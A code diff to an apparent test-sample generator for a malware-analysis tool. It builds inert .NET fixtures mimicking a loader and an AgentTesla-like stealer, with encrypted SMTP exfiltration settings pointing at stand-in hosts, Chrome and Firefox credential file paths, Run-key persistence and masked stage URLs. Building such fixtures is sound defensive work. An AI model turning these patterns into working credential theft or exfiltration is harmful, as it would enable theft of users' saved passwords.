@@ -2474,26 +2474,33 @@ def dotnet_loader_exe() -> bytes:
     smtp += bytes([16 - len(smtp) % 16]) * (16 - len(smtp) % 16)
     e2 = Cipher(algorithms.AES(hashlib.md5(b"InvoiceSync2024").digest()), modes.CBC(b"\x00" * 16)).encryptor()
     enc_smtp = base64.b64encode(e2.update(smtp) + e2.finalize()).decode()
+    enc_gate = bytes(c ^ b"inv"[i % 3] for i, c in enumerate(CODE_URL.encode() + b"/gate"))
     enc_ip = base64.b64encode(bytes(c ^ b"inv"[i % 3] for i, c in enumerate(b"203.0.113.47:587"))).decode()
     spec = {"assembly": "InvoiceViewer", "version": (2, 1, 0, 0),
             "refs": [("mscorlib", (4, 0, 0, 0)), ("System", (4, 0, 0, 0))],
             "typerefs": [(0, "System.Reflection", "Assembly"), (None, "", "ConfusedByAttribute"),
                          (1, "System.Net", "WebClient"), (0, "Microsoft.Win32", "RegistryKey"),
-                         (0, "System.Security.Cryptography", "RijndaelManaged"), (0, "System", "Convert")],
+                         (0, "System.Security.Cryptography", "RijndaelManaged"), (0, "System", "Convert"),
+                         (0, "System.Runtime.CompilerServices", "RuntimeHelpers")],
             "memberrefs": [(1, ".ctor"), (2, "DownloadData"), (0, "Load"), (3, "SetValue"), (4, "CreateDecryptor"),
-                           (2, ".ctor"), (5, "FromBase64String")],
+                           (2, ".ctor"), (5, "FromBase64String"), (6, "InitializeArray"), (0, "GetManifestResourceStream")],
+            "static_arrays": [("stage_key", DOTNET_PAYLOAD_KEY), ("gate", enc_gate)],
             "attributes": [("module", 1)],
             "types": [{"ns": "InvoiceViewer", "name": "Program", "methods": [
                 {"name": "Main", "entry": True, "ops": [("ldstr", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                                                         ("ldstr", "InvoiceViewer"), ("callvirt", 3), ("ret",)]},
                 {"name": "Configure", "ops": [("ldstr", enc_smtp), ("calldef", "StringCipher::Decrypt"), ("pop",),
-                                              ("ldstr", enc_ip), ("calldef", "StringCipher::Unmask"), ("pop",), ("ret",)]},
+                                              ("ldstr", enc_ip), ("calldef", "StringCipher::Unmask"), ("pop",),
+                                              ("initarray", "gate", len(enc_gate), 7), ("calldef", "StringCipher::Unmask"),
+                                              ("ret",)]},
                 {"name": "LoadStage", "ops": [("newobj", 5), ("ldstr", CODE_URL), ("callvirt", 1), ("call", 2),
                                               ("pop",), ("ret",)]}]},
                       {"ns": "InvoiceViewer", "name": "StringCipher", "methods": [
                           {"name": "Decrypt", "ops": [("ldarg.0",), ("call", 6), ("ldstr", "InvoiceSync2024"), ("callvirt", 4),
                                                       ("xor",), ("ret",)]},
-                          {"name": "Unmask", "ops": [("ldarg.0",), ("call", 6), ("ldstr", "inv"), ("xor",), ("ret",)]}]},
+                          {"name": "Unmask", "ops": [("ldarg.0",), ("call", 6), ("ldstr", "inv"), ("xor",), ("ret",)]},
+                          {"name": "OpenStage", "ops": [("ldstr", "InvoiceViewer.Resources.stage2.bin"), ("call", 8),
+                                                        ("initarray", "stage_key", 16, 7), ("callvirt", 4), ("ret",)]}]},
                       {"ns": "InvoiceViewer", "name": "NativeMethods",
                        "methods": [{"name": "VirtualAlloc", "pinvoke": ("kernel32.dll", "VirtualAlloc")},
                                    {"name": "CreateThread", "pinvoke": ("kernel32.dll", "CreateThread")}]}],
@@ -2508,6 +2515,44 @@ def dotnet_loader_exe() -> bytes:
                                                              "FileDescription": "Invoice Viewer"})
 
 
+def dotnet_stealer_exe() -> bytes:
+    """InvoiceMailSync.exe: an AgentTesla-like stealer whose exfiltration settings
+    (SMTP server, account, port) are AES-256 encrypted literals (key SHA-256 of a builder
+    string), decrypted by ``Settings::Dec``. The credential paths are plain. The
+    .NET analysis decrypts them statically and the C2 tab shows the config.
+    Inert: method bodies only load strings and return."""
+    import base64
+    import hashlib
+    import binkit as bk
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    key = hashlib.sha256(b"MailSync#Builder").digest()
+
+    def enc(t: str) -> str:
+        b = t.encode()
+        b += bytes([16 - len(b) % 16]) * (16 - len(b) % 16)
+        e = Cipher(algorithms.AES(key), modes.CBC(b"\x00" * 16)).encryptor()
+        return base64.b64encode(e.update(b) + e.finalize()).decode()
+    cfg = [enc("smtp.billing-portal.example"), enc("accounts@billing-portal.example"), enc("587")]
+    spec = {"assembly": "InvoiceMailSync", "version": (1, 4, 0, 0),
+            "refs": [("mscorlib", (4, 0, 0, 0)), ("System", (4, 0, 0, 0))],
+            "typerefs": [(1, "System.Net.Mail", "SmtpClient"), (0, "System", "Convert"),
+                         (0, "System.Security.Cryptography", "RijndaelManaged")],
+            "memberrefs": [(0, ".ctor"), (1, "FromBase64String"), (2, "CreateDecryptor")],
+            "types": [{"ns": "InvoiceMailSync", "name": "Program", "methods": [
+                {"name": "Main", "entry": True, "ops": [("ldstr", cfg[0]), ("calldef", "Settings::Dec"), ("pop",),
+                                                        ("ldstr", cfg[1]), ("calldef", "Settings::Dec"), ("pop",),
+                                                        ("ldstr", cfg[2]), ("calldef", "Settings::Dec"), ("pop",),
+                                                        ("newobj", 0), ("ret",)]},
+                {"name": "Collect", "ops": [("ldstr", "\\Google\\Chrome\\User Data\\Default\\Login Data"),
+                                            ("ldstr", "\\Mozilla\\Firefox\\Profiles"), ("ldstr", "logins.json"),
+                                            ("ret",)]}]},
+                      {"ns": "InvoiceMailSync", "name": "Settings", "methods": [
+                          {"name": "Dec", "ops": [("ldarg.0",), ("call", 1), ("ldstr", "MailSync#Builder"),
+                                                  ("callvirt", 2), ("ret",)]}]}]}
+    return bk.pe(bits=32, gui=True, dotnet_md=spec, version={"CompanyName": "Invoice Sync Example",
+                                                             "FileDescription": "Invoice Mail Sync"})
+
+
 def _deflate(b: bytes) -> bytes:
     import zlib
     c = zlib.compressobj(9, zlib.DEFLATED, -15)
@@ -2515,7 +2560,8 @@ def _deflate(b: bytes) -> bytes:
 
 
 def dotnet_samples() -> dict[str, bytes]:
-    return {"dotnet/sample_dotnet_loader.exe": dotnet_loader_exe()}
+    return {"dotnet/sample_dotnet_loader.exe": dotnet_loader_exe(),
+            "dotnet/sample_dotnet_stealer.exe": dotnet_stealer_exe()}
 
 
 def code_samples() -> dict[str, bytes]:
